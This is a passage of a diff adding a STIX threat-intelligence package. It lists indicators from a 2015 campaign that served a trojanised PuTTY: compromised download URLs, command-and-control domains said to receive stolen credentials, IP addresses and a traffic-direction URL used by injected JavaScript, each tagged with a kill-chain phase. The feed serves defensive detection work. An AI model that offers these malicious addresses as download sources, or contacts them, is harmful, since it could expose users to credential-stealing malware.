+            <URIObj:Value condition="Equals">http://stephensimmer.com/putty/</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2015-05-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-1d8b125e-3b41-4473-8820-413261775725" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>This site hosted a malicious version of PuTTy.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-d9e5c28d-99bf-4009-86c8-7cb99e13daa9">
+        <cybox:Object id="CISCP:Object-f0004af0-839a-4594-8703-c7c913a17d18">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://biznetbrokers.com/putty/</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2015-05-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-68de2914-bc17-49e7-9f60-57eb672d0825" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>This site hosted a malicious version of PuTTy.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-d86b05e1-08d2-4f04-8cff-da68e1a45190">
+        <cybox:Object id="CISCP:Object-dd37e6d0-32f9-4331-9511-2b5f76a6a6ec">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://ofbcorporation.com/putty/</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2015-05-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-c90807a3-089f-454d-8931-0855c694eba5" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>This site hosted a malicious version of PuTTy.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-020a148b-d9ad-43bf-b794-f0af5ef8bfa5">
+        <cybox:Object id="CISCP:Object-ebe18d60-1e53-4b6b-a75e-c3c77b883e50">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://spriebel.de/putty/</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2015-05-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-aa123448-8f06-4e20-87c6-857c7eb83b91" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>This site hosted a malicious version of PuTTy.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-618c0635-86d9-4b61-a10e-6553576675e1">
+        <cybox:Object id="CISCP:Object-7491971e-da86-417f-a482-a670d281409e">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://siteweb.olympe.in/putty/</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2015-05-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-4e52e0e3-16cd-4276-b618-946e5f96480c" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>This site hosted a malicious version of PuTTy.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-67259e4c-5dd6-41ed-950b-69c74c9fde8d">
+        <cybox:Object id="CISCP:Object-653e8a2c-2779-49a3-9ac2-4086b7e61558">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://yumyums.comcastbiz.net/putty/</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2015-05-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-5c100221-e02e-4a39-bb75-95a78479fd64" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>This site hosted a malicious version of PuTTy.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-366e13d6-e559-4d8a-b8ea-ffcc5a45d590">
+        <cybox:Object id="CISCP:Object-e874b151-16dd-469c-840f-452752cbb4df">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://prfc.com.au/putty/</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2015-05-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-ae9395fb-8fcf-4a52-9de2-e51a6fd59843" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>This site hosted a malicious version of PuTTy.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-6ae24bb0-8ccb-4aac-8423-c0f3d274b389">
+        <cybox:Object id="CISCP:Object-f754638c-5428-44bc-8424-d5a8a4089d70">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://helpmydiabetes.info/wp-includes/</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2015-05-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-c6a59467-d03b-483c-b795-404096037213" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
+      <indicator:Description>This domain is associated with IP 146.185.239.3. It was previously used in the StealZilla campaign, which served a malicious version of the FileZilla FTP client. This domain received stolen credential information from compromised systems.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-87fcb480-6a19-4de8-86a6-d477a91d85d9">
+        <cybox:Object id="CISCP:Object-8b9fc938-7356-4f97-9ad4-fecee3000b12">
+          <cybox:Properties type="Domain Name" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">beautyandcutie.net </URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2015-05-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-70765433-ab27-4105-a0cd-a91602f85a1e" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
+      <indicator:Description>This domain hosted the malicious version of PuTTY. It was previously used in the StealZilla campaign, which served a malicious version of the FileZilla FTP client. This domain received stolen credential information from compromised systems.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-97c251a1-6090-48de-9467-67e23182f162">
+        <cybox:Object id="CISCP:Object-8ec7c2ce-866f-414e-8716-3b8cc00fe388">
+          <cybox:Properties type="Domain Name" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">ngusto-uro.ru </URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2015-05-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-e2851927-5033-4a42-b35c-3a471182b2eb" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
+      <indicator:Description>This domain hosted the malicious version of PuTTY. It was previously used in the StealZilla campaign, which served a malicious version of the FileZilla FTP client. This domain received stolen credential information from compromised systems.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-4b293aca-f26c-429c-9cbc-5902109c0117">
+        <cybox:Object id="CISCP:Object-02469bc7-9f50-4672-a3e3-9a14c4d2c60a">
+          <cybox:Properties type="Domain Name" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">go-upload.ru </URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2015-05-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-eb1d2201-1eb6-4655-b7b8-91d1847b0321" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
+      <indicator:Description>This domain hosted the malicious version of PuTTY. It was previously used in the StealZilla campaign, which served a malicious version of the FileZilla FTP client. This domain received stolen credential information from compromised systems.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-fec3785f-39a5-495e-bcef-886d11a89876">
+        <cybox:Object id="CISCP:Object-2cc90269-b3f1-4b5b-a852-516015b00f8f">
+          <cybox:Properties type="Domain Name" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">aliserv2013.ru </URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2015-05-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-c206db15-b644-4735-bd6f-74b3312f0395" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type>
+      <indicator:Description>Posts on various forums referenced the IP address 146.185.239.3 from injected JavaScript code used on multiple compromised sites containing various PHP frameworks. The domains used by the threat actors for StealZilla and MalPutty also currently resolve to this IP address, and previously used 144.76.120.243.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-85c8c262-cb49-4b3c-bf3b-edc3ec605675">
+        <cybox:Object id="CISCP:Object-cd222f4b-b8e9-49b4-b5a0-681928a7cb44">
+          <cybox:Properties category="ipv4-addr" xsi:type="AddressObj:AddressObjectType">
+            <AddressObj:Address_Value condition="Equals">146.185.239.3 </AddressObj:Address_Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2015-05-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-1e38f08e-e42d-41b4-b2b7-7514a9c59a06" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type>
+      <indicator:Description>Compromised servers host seemingly legitimate copies of the HTML pages used for PuTTY, but with small variations including words to catch attention and even a picture of the malicious version of PuTTY. All of the fake pages are dumped in a /putty directory on the compromised webservers:
+
+/putty/super-magnetic-putty.html
+/putty/garnier-putty.html
+/putty/putty.html
+
+The compromised web servers have nothing to do with PuTTY or SSH clients outside of this directory.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-13142360-297b-4743-9850-ccfe3956c90a">
+        <cybox:Object id="CISCP:Object-7a44f11b-1a29-4584-9977-7b4e56320fe5">
+          <cybox:Properties category="ipv4-addr" xsi:type="AddressObj:AddressObjectType">
+            <AddressObj:Address_Value condition="Equals">144.76.120.243 </AddressObj:Address_Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2015-05-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-01797c9a-b331-4dda-b99d-ba38bb18736d" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type>
+      <indicator:Description>The injected JavaScript uses the URI http://146.185.239.3/sTDS/go.php, which appears to run the Traffic Direction Systems (TDS) framework sTDS. TDS services can be used for malicious activities such as delivering exploit kits. This JavaScript attempts to identify characteristics of the compromised device to form a key sent to the TDS to determine the routing of the device.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-484208c1-e72c-481b-8093-0481b9ab7994">
+        <cybox:Object id="CISCP:Object-06eca960-963b-43e4-93b9-f8e716063ab6">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://146.185.239.3/sTDS/go.php</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2015-05-13T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+  </stix:Indicators>
+  <stix:TTPs>
+    <stix:Kill_Chains>
+      <stixCommon:Kill_Chain definer="LMCO" id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="LM Cyber Kill Chain" number_of_phases="7" reference="http://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf">
+        <stixCommon:Kill_Chain_Phase name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/>
+        <stixCommon:Kill_Chain_Phase name="Weaponization" ordinality="2" phase_id="stix:KillChainPhase-445b4827-3cca-42bd-8421-f2e947133c16"/>
+        <stixCommon:Kill_Chain_Phase name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+        <stixCommon:Kill_Chain_Phase name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/>
+        <stixCommon:Kill_Chain_Phase name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+        <stixCommon:Kill_Chain_Phase name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+        <stixCommon:Kill_Chain_Phase name="Actions on Objectives" ordinality="7" phase_id="stix:KillChainPhase-786ca8f9-2d9a-4213-b38e-399af4a2e5d6"/>
+      </stixCommon:Kill_Chain>
+    </stix:Kill_Chains>
+  </stix:TTPs>
+</stix:STIX_Package>
+
